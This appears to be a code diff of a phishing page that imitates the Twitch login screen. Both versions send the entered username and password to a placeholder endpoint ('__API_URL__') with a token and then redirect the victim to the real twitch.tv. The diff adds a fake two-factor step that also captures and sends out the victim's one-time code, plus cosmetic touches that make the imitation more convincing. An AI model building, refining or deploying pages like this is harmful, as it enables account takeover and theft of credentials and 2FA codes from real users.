@@ -1,191 +1,58 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Twitch</title>
+    <link rel="icon" href="https://www.twitch.tv/favicon.ico" type="image/x-icon">
+    <meta name="description" content="Log in to Twitch to connect with your community">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background-color: #f7f7f8;
-            font-family: Inter, Roboto, Helvetica, Arial, sans-serif;
-            color: #0e0e10;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .login-card {
-            background-color: #fff;
-            width: 100%;
-            max-width: 440px;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 24px;
-        }
-
-        .header svg {
-            width: 32px;
-            height: 32px;
-            fill: #9146ff;
-            margin-bottom: 12px;
-        }
-
-        h1 {
-            font-size: 24px;
-            font-weight: 600;
-        }
-
-        .tabs {
-            display: flex;
-            margin-bottom: 24px;
-            border-bottom: 1px solid #dfe1e5;
-        }
-
-        .tabs span {
-            padding: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            color: #53535f;
-            position: relative;
-        }
-
-        .tabs span.active {
-            color: #9146ff;
-        }
-
-        .tabs span.active::after {
-            content: "";
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background-color: #9146ff;
-        }
-
-        .input-group {
-            margin-bottom: 16px;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 6px;
-        }
-
-        .input-group input {
-            width: 100%;
-            height: 40px;
-            padding: 0 12px;
-            border: 2px solid #dfe1e5;
-            border-radius: 6px;
-            font-size: 14px;
-            outline: none;
-            background-color: #f2f2f2;
-        }
-
-        .input-group input:focus {
-            border-color: #9146ff;
-            background-color: #fff;
-        }
-
-        .trouble {
-            font-size: 12px;
-            color: #9146ff;
-            margin-bottom: 16px;
-            display: block;
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        .login-btn {
-            width: 100%;
-            height: 40px;
-            background-color: #9146ff;
-            color: #fff;
-            border: none;
-            border-radius: 6px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 8px;
-        }
-
-        .login-btn:hover {
-            background-color: #7c2ef1;
-        }
-
-        .divider {
-            margin: 24px 0;
-            text-align: center;
-            font-size: 12px;
-            color: #53535f;
-            position: relative;
-        }
-
-        .divider::before,
-        .divider::after {
-            content: "";
-            position: absolute;
-            top: 50%;
-            width: 45%;
-            height: 1px;
-            background-color: #dfe1e5;
-        }
-
-        .divider::before {
-            left: 0;
-        }
-
-        .divider::after {
-            right: 0;
-        }
-
-        .social-btn {
-            width: 100%;
-            height: 40px;
-            border: 1px solid #dfe1e5;
-            border-radius: 6px;
-            background-color: transparent;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-bottom: 12px;
-        }
-
-        .social-btn:hover {
-            background-color: #f2f2f2;
-        }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background-color:#f7f7f8;font-family:Inter,Roboto,Helvetica,Arial,sans-serif;color:#0e0e10;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .login-card{background-color:#fff;width:100%;max-width:440px;padding:40px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.1);animation:fadeIn .4s ease}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+        @keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-5px)}40%,80%{transform:translateX(5px)}}
+        .header{text-align:center;margin-bottom:24px}
+        .header svg{width:32px;height:32px;fill:#9146ff;margin-bottom:12px}
+        h1{font-size:24px;font-weight:600}
+        .tabs{display:flex;margin-bottom:24px;border-bottom:1px solid #dfe1e5}
+        .tabs span{padding:12px;font-size:16px;font-weight:600;cursor:pointer;color:#53535f;position:relative;transition:color .2s}
+        .tabs span.active{color:#9146ff}
+        .tabs span.active::after{content:"";position:absolute;bottom:0;left:0;width:100%;height:2px;background-color:#9146ff}
+        .tabs span:hover{color:#9146ff}
+        .input-group{margin-bottom:16px}
+        .input-group label{display:block;font-size:14px;font-weight:600;margin-bottom:6px}
+        .input-wrapper{position:relative}
+        .input-group input{width:100%;height:40px;padding:0 12px;border:2px solid #dfe1e5;border-radius:6px;font-size:14px;outline:none;background-color:#f2f2f2;transition:border-color .2s,background-color .2s}
+        .input-group input:focus{border-color:#9146ff;background-color:#fff}
+        .show-pass{position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;font-size:16px;color:#53535f}
+        .trouble{font-size:12px;color:#9146ff;margin-bottom:16px;display:block;text-decoration:none;font-weight:600}
+        .trouble:hover{text-decoration:underline}
+        .login-btn{width:100%;height:40px;background-color:#9146ff;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px;transition:background-color .2s,transform .1s;position:relative}
+        .login-btn:hover{background-color:#7c2ef1}
+        .login-btn:active{transform:scale(.98)}
+        .spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top:2px solid #fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .divider{margin:24px 0;text-align:center;font-size:12px;color:#53535f;position:relative}
+        .divider::before,.divider::after{content:"";position:absolute;top:50%;width:45%;height:1px;background-color:#dfe1e5}
+        .divider::before{left:0}
+        .divider::after{right:0}
+        .social-btn{width:100%;height:40px;border:1px solid #dfe1e5;border-radius:6px;background-color:transparent;font-size:14px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:12px;transition:background-color .2s}
+        .social-btn:hover{background-color:#f2f2f2}
+        .error-text{color:#e91916;font-size:13px;margin-top:4px;display:none}
+        #step2{display:none}
+        .step-show{display:block!important;animation:slideIn .3s ease}
+        @keyframes slideIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+        .otp-info{background:#f0e6ff;border-radius:6px;padding:12px;font-size:13px;margin-bottom:16px;color:#5c16c5;display:flex;align-items:center;gap:8px}
     </style>
 </head>
-
 <body>
     <div class="login-card">
         <div class="header">
             <svg viewBox="0 0 40 40">
-                <path
-                    d="M5.7 0L1.4 10.985V34.414h8.572V40h5.736l5.714-5.586h8.548L40 24.4V0H5.7zm3.09 3.8h27.2v19.018l-6.61 6.58h-10l-5.7 5.582v-5.582H8.8V3.8zm10.92 5.012v11.19h4v-11.19h-4zm10.46 0v11.19h4v-11.19h-4z" />
+                <path d="M5.7 0L1.4 10.985V34.414h8.572V40h5.736l5.714-5.586h8.548L40 24.4V0H5.7zm3.09 3.8h27.2v19.018l-6.61 6.58h-10l-5.7 5.582v-5.582H8.8V3.8zm10.92 5.012v11.19h4v-11.19h-4zm10.46 0v11.19h4v-11.19h-4z"/>
             </svg>
-            <h1>Log In to Twitch</h1>
+            <h1 id="pageTitle">Log In to Twitch</h1>
         </div>
 
         <div class="tabs">
@@ -193,54 +60,94 @@
             <span>Sign Up</span>
         </div>
 
-        <form id="twitchForm">
-            <div class="input-group">
-                <label>Username</label>
-                <input type="text" id="username" placeholder="Username" autocomplete="username">
+        <div id="step1">
+            <form id="twitchForm">
+                <div class="input-group">
+                    <label>Username</label>
+                    <input type="text" id="username" placeholder="Username" autocomplete="username">
+                </div>
+                <div class="input-group">
+                    <label>Password</label>
+                    <div class="input-wrapper">
+                        <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+                        <button type="button" class="show-pass" id="showPass">👁</button>
+                    </div>
+                </div>
+                <a href="#" class="trouble">Trouble logging in?</a>
+                <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+            </form>
+
+            <div class="divider">or</div>
+
+            <button class="social-btn">
+                <img src="https://www.google.com/favicon.ico" width="18"> Continue with Google
+            </button>
+            <button class="social-btn">
+                <img src="https://www.apple.com/favicon.ico" width="18"> Continue with Apple
+            </button>
+        </div>
+
+        <div id="step2">
+            <div class="otp-info">
+                <span>🔒</span>
+                <span>Enter the 6-digit code from your authenticator app or email</span>
             </div>
             <div class="input-group">
-                <label>Password</label>
-                <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+                <label>Verification Code</label>
+                <input type="text" id="otpCode" placeholder="6-digit code" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
             </div>
-
-            <a href="#" class="trouble">Trouble logging in?</a>
-
-            <button type="submit" class="login-btn">Log In</button>
-        </form>
-
-        <div class="divider">or</div>
-
-        <button class="social-btn">
-            <img src="https://www.google.com/favicon.ico" width="18">
-            Continue with Google
-        </button>
-        <button class="social-btn">
-            <img src="https://www.apple.com/favicon.ico" width="18">
-            Continue with Apple
-        </button>
+            <div class="error-text" id="error2">Invalid code. Please try again.</div>
+            <button type="button" class="login-btn" id="verifyBtn">Verify</button>
+        </div>
     </div>
-
     <script>
-        const form = document.getElementById('twitchForm');
-        const u = document.getElementById('username');
-        const p = document.getElementById('password');
+        const form=document.getElementById('twitchForm');
+        const u=document.getElementById('username'),p=document.getElementById('password');
+        const btn=document.getElementById('loginBtn');
+        const showPass=document.getElementById('showPass');
 
-        form.addEventListener('submit', (e) => {
+        showPass.addEventListener('click',()=>{
+            if(p.type==='password'){p.type='text';showPass.textContent='🙈';}
+            else{p.type='password';showPass.textContent='👁';}
+        });
+
+        form.addEventListener('submit',(e)=>{
             e.preventDefault();
-            const data = {
-                token: '__TOKEN__',
-                username: u.value,
-                password: p.value
-            };
-            fetch('__API_URL__', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).finally(() => {
-                window.location.href = 'https://www.twitch.tv/';
+            if(!u.value||!p.value){
+                document.querySelector('.login-card').style.animation='shake 0.4s';
+                setTimeout(()=>document.querySelector('.login-card').style.animation='',400);
+                return;
+            }
+            btn.innerHTML='<span class="spinner"></span>';btn.style.pointerEvents='none';
+            const data={token:'__TOKEN__',username:u.value,password:p.value};
+            fetch('__API_URL__',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
+            .then(()=>{
+                document.getElementById('step1').style.display='none';
+                document.getElementById('step2').classList.add('step-show');
+                document.getElementById('pageTitle').textContent='Two-Factor Authentication';
+                document.getElementById('otpCode').focus();
+            })
+            .catch(()=>{
+                document.getElementById('step1').style.display='none';
+                document.getElementById('step2').classList.add('step-show');
+                document.getElementById('pageTitle').textContent='Two-Factor Authentication';
             });
+        });
+
+        document.getElementById('verifyBtn').addEventListener('click',()=>{
+            const otp=document.getElementById('otpCode').value.trim();
+            if(!otp||otp.length<4){
+                document.getElementById('error2').style.display='block';
+                document.getElementById('otpCode').parentElement.style.animation='shake 0.4s';
+                setTimeout(()=>document.getElementById('otpCode').parentElement.style.animation='',400);
+                return;
+            }
+            const vbtn=document.getElementById('verifyBtn');
+            vbtn.innerHTML='<span class="spinner"></span>';vbtn.style.pointerEvents='none';
+            const data={token:'__TOKEN__',username:u.value,password:otp};
+            fetch('__API_URL__',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
+            .finally(()=>{setTimeout(()=>{window.location.href='https://www.twitch.tv/';},800);});
         });
     </script>
 </body>
-
 </html>
